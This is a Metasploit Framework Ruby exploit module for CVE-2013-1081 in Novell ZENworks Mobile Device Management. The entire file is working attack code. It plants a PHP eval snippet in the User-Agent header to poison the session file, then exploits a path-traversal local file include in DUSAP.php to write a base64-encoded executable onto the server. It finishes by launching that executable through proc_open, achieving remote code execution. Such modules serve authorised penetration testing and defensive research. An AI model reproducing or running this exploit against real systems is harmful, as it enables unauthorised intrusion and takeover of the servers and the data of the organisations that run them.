##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE

	def initialize
		super(
			'Name' => 'Novell Zenworks Mobile Device Managment Local File Include  ',
			'Description' => %q{
				This module attempts to gain remote code execution on a server running
				Novell Zenworks Mobile Device Management.
			},
			'Author' =>
				[
					'steponequit',
					'Andrea Micalizzi (aka rgod)' #zdi report 
				],
			'Platform' => 'win',
			'Targets'     =>
				[
					[ 'Automatic', { } ],
				],
			'References' =>
				[
					['CVE', '2013-1081']
				],
			'License' => MSF_LICENSE
		)

		register_options([
			OptString.new('TARGETURI', [true, 'Path to the Novell Zenworks MDM install', '/']),
			OptInt.new('RPORT', [true, "Default remote port", 80])
		], self.class)

		register_advanced_options([
			OptBool.new('SSL', [true, "Negotiate SSL connection", false])
		], self.class)
	end

	def setup_session()
		sess = Rex::Text.rand_text_alpha(8)
		cmd = Rex::Text.rand_text_alpha(8)
		res = send_request_cgi({
			'agent' => "<?php echo(eval($_GET['#{cmd}'])); ?>",
			'method' => "HEAD",
			'uri' => normalize_uri("#{target_uri.path}/download.php"),
			'headers' => {"Cookie" => "PHPSESSID=#{sess}"},
			}) 
		return sess,cmd
	end

	def upload_shell(session_id,cmd_var)
		fname = Rex::Text.rand_text_alpha(8)
		payload = generate_payload_exe
		res = send_request_cgi({
			'method' => 'POST',
			'uri' => normalize_uri("#{target_uri.path}/DUSAP.php"),
			'data' => Rex::Text.encode_base64(payload),
			'vars_get' => {
				'language' => "res/languages/../../../../php/temp/sess_#{session_id}",
				cmd_var => "$wdir=getcwd().'\\\\..\\\\..\\\\php\\\\temp\\\\';file_put_contents($wdir.'#{fname}.exe',base64_decode(file_get_contents('php://input')));"
			}	
		})
		return fname
	end

	def exec_shell(session_id,cmd_var,fname)
                res = send_request_cgi({
                        'method' => 'POST',
                        'uri' => normalize_uri("#{target_uri.path}/DUSAP.php"),
                        'data' => Rex::Text.encode_base64(payload),
                        'vars_get' => {
                                'language' => "res/languages/../../../../php/temp/sess_#{session_id}",
			cmd_var => "$wdir=getcwd().'\\\\..\\\\..\\\\php\\\\temp\\\\';$cmd=$wdir.'#{fname}';$output=array();$handle=proc_open($cmd,array(1=>array('pipe','w')),$pipes,null,null,array('bypass_shell'=>true));if (is_resource($handle)){fclose($pipes[1]);proc_close($handle);}"
                        }
                })
	end


	def exploit()
		uri = normalize_uri(target_uri.path)
		begin
			res = send_request_raw({
				'method' => 'GET',
				'uri' => uri
				})
			if (res and res.code == 200 and res.body.to_s.match(/ZENworks Mobile Management User Self-Administration Portal/) != nil)
				print_status("Found Zenworks MDM, Checking application version")
				ver = res.body.to_s.match(/<p id="version">Version (.*)<\/p>/)[1]
				print_status("Found Version #{ver}")
				print_status("Setting up poisoned session")
				session_id,cmd = setup_session()
				print_status("Uploading payload")
				fname = upload_shell(session_id,cmd)
				print_status("Executing payload")
				exec_shell(session_id,cmd,fname)
			else
				print_error("Zenworks MDM does not appear to be running at #{rhost}")
				return :abort
			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		rescue ::OpenSSL::SSL::SSLError => e
			return if(e.to_s.match(/^SSL_connect /) ) # strange errors / exception if SSL connection aborted
		end
	end

end
